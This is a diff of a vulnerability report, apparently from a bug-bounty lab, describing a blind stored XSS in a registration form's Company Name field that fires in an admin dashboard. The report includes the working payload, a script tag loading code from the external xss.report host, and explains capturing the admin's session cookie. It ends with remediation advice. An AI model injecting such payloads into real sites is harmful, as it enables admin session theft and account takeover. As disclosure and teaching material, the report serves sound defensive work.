@@ -8,33 +8,32 @@ Blind XSS
 
 ---
 ## Summary
-The Company Name field during registration does not sanitize or encode user-supplied input before storing it in the database. The registration page itself even shows a warning saying "This field accepts any input including HTML content" which directly confirms the field treats user input as raw HTML. What makes this different from regular XSS is that the payload does not fire on the attacker's end at all. It silently sits in the database and only executes when an admin logs in and views the dashboard where user company details are displayed. The attacker has no idea it fired until they check their XSS reporting tool, which captured the admin session the moment they opened the dashboard.
+I identified a blind XSS in the **company Name Feild** during user registration. The feild accepts and stores raw HTML without any sanitization. The payload does not executes on the user side - it fires silently in the admin panel when an admin views the registered users list.This was confirmed via XSS report which captured a screenshot of the admin panel where the payload executed.
 
 ---
 ## Vulnerable Endpoint
 ```
 https://kzlabs.com/63.php?view=register
 ```
-**Vulnerable Parameter:** Company Name field in the registration form
-
 ---
 ## Steps to Reproduce
-1. Go to `https://kzlabs.com/63.php?view=register` and create a new account.
+1. Register a new account in the following URL
+ `https://kzlabs.com/63.php?view=register`
+
 2. In the **Company Name** field enter the following blind XSS payload:
 ```
 '"><script src=https://xss.report/c/shaz10></script>
 ```
-3. Notice the warning below the field saying "This field accepts any input including HTML content" confirming the field has no input filtering.
-4. Complete registration and log in.
+3. Complete registration and log in.
 5. Navigate to **My Profile** and the Company field shows `'">` confirming the payload was stored as-is but the script tag portion loaded silently in the background.
 6. Wait for the admin to log in and open the admin dashboard.
-7. Once the admin visits the dashboard the payload fires on their end and the XSS reporting tool at `xss.report` captures the execution along with a screenshot of what the admin saw.
-8. The XSS report dashboard confirms the payload executed in the admin's browser showing a screenshot of the admin panel with the session cookie visible.
+7. Once the admin visits the dashboard the payload fires on their end and the XSS reporting tool at `xss.report` captures the execution along with a screenshot of what the admin viwed.
+8. The XSS report dashboard captured a screenshot of the admin panel confirming execution
 
 ---
 ## Payload Used
 ```
-'"><script src=https://xss.report/c/shaz10></script>
+'"><script src=https://xss.report/c/ali1></script>
 ```
 
 ---
@@ -62,15 +61,15 @@ https://kzlabs.com/63.php?view=register
 
 ---
 ## Impact
-- This is blind XSS targeting the admin panel specifically so the attacker never sees it fire but the damage is already done on the admin's end
-- The XSS report captured the admin's session cookie which can be used to take over the admin account completely
+- The payload executes silently in the admin browser with zero interaction-just by opening the dashboard and viewing recent registrations 
+- Admin session cookie is exposed - attacker can take over the admin account completly with no password needed.
 - Since the admin has full access to manage all registered users a compromised admin account means full control over the entire platform
 - The attacker also gets a screenshot of exactly what the admin sees leaking sensitive internal data like user emails, registration details and platform stats
-- Complete account takeover of the highest privilege account on the platform with zero interaction required from the attacker after registration
+- The victim admin has no isea anything happened - the page look completely normal.
 
 ---
 ## Remediation
-1. Filter out HTML tags like `<script>`, `<img>`, `<svg>` from the Company Name field before saving anything to the database
+1. Filter out dangerous HTML tags like `<script>`, `<img>`, `<svg>` from the Company Name field before saving anything to the database
 2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
 3. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
 4. Implement a strict **Content Security Policy (CSP)** header that blocks loading of external scripts as this would have directly prevented the `xss.report` script from loading even if the payload got stored
